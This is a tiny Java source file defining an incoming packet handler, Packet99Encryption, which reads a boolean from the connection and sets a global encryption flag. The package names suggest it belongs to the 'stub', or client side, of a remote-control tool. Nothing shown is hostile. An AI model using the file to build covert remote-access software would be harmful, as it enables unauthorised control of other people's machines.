package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class Packet99Encryption extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
